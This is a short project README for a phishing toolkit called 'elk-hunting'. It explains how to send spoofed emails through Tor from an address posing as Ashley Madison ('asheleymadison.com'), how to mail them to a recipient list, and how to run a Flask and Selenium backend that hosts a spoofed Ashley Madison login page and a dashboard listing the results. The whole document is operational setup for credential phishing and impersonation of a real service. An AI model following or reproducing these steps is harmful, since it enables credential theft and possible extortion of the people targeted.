# elk-hunting

Email Spoofer (requires JDK):
============================
1) Create a mail2tor account by logging into http://mail2tor2zyjdctd.onion/ through the tor browser
2) Change squirrelmail personal info to match the email address you are trying to spoof (no-reply@asheleymadison.com)
3) Start the tor browser, noting the port that the socks5 proxy is running on (9050 or whatever it says in the tor logs).  Change SpoofEmail.java "socks_port" to match that port
3) Run compile.sh
4) Call ./run.sh test_emails.txt (or whatever email list you'd like to send to)


Backend: (requires python 3):
============================
1) pip install flask selenium
2) brew cask install chromedriver
3) brew cask install google-chrome
4) ./start_backend.sh

Spoofed login prompt: localhost:5000/ashley/AshleyMadison.htm
Dashboard:            localhost:5000/list

